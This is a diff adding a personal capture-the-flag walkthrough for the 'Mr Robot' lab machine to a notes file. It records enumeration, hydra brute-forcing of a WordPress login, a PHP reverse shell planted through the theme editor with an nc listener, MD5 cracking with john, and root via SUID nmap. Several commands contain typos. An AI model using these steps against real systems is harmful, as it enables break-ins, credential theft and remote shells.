@@ -379,6 +379,80 @@ AgentSudo
 	>cat /root/root.txt   //Found flag
 
 ======================================================================================
+MR ROBOT CTF
+	Enumeration
+	-----------
+	nmap -sV -sC -oA 10.10.12.13
+	3 ports open 22/tcp closed ssh
+	80/tcp open http
+	443/tcp open ssl/http Apache
+
+	visit 10.10.12.13 & robots.txt in browser
+	Found fsocity.dic & key-1-of-3.txt
+	download dic file
+
+	terminal
+	>gobuster dir -u http://10.10.12.13 -w /opt/directory-list-2.3-small.txt -t 100 -p -o scans.txt
+	Found few interesting locations   /wp-lgin.php
+
+	intercept lgin page with burpsuite
+
+	terminal
+	>hydra -L  Elliot -P fsocity.dic 10.10.12.13 http-post-form "/wp-login.php:log=^USER&pws=^PWD^:Invalid username -t 30 
+	
+	Try wp-login 	, user name Elliot & wrong password, see error phrase
+
+	>hydra -l  Elliot -P fsocity.dic 10.10.12.13 http-post-form "/wp-login.php:log=^USER&pws=^PWD^:The password you entered for the username -t 30 
+	we can use wp-scan tool to bruite force
+	Found password ER28-0652
+	Login to wordpress page as Elliot,role- editor
+	
+	crawel the site and see anywhere we can edit/upload malicious PHP file (download reverse PHP file from testmonkey github)
+
+	terminal- start nc listener
+	>rlwrap nc -lvnp 53    (53- is the DNS port)
+
+	Go to Wp application page-> Edit Themes-> paste php reverse shell code and modify IP & port (53)
+
+	visit  http://10.10.12.13/wp-content/themes/twentyfifteen/archive.php
+	After visit or execute malicious php file, we can see we got shell
+	>whoami   //daemon
+	>ls /home  //robot
+	>cd /home/robot  //key-2-of-3.txt, password.raw-md5
+	>ls -lsa  //key-2-of-3.txt   , all users can read only
+	>cat password.raw-md5  //Found password  in hash format
+	
+	//Try decrypt using john
+	>john md5.hash --wordlist=fsocity.dic --format=Raw-md5    //password decrypted
+
+	//--format=Raw-md5  is guess to save time
+
+	Note: hashidentifier tool can use for identify type of hash
+
+	//Goto robot user shell
+	& //upgrade current php shell using python command
+	>python -c 'import pty;pty.spawn("/bin/bash")'
+	daemon@linux:/home/robot$
+
+	as we know there is an robot user, login to robot as super user
+	daemon@linux:/home/robot$su robot  //enter password we gor above(decrypted)
+
+	robot@linux$whoami   //robot
+
+	//escalate to root user
+	look for suid binaries that has suid bit enabled
+	robot@linux$fin /-perm +6000 2>/dev/null | grep '/bin/'
+
+	from above command output we can see /usr/local/bin/nmap
+	search for GTFOBins
+	robot@linux$/usr/local/bin/nmap -interactive
+
+	//we got nmap interactive shell
+	nmap>!sh
+	#whoami  //found root
+	firstboot_done key-3-of-3.txt
+
+==================================================================================
 
 
 
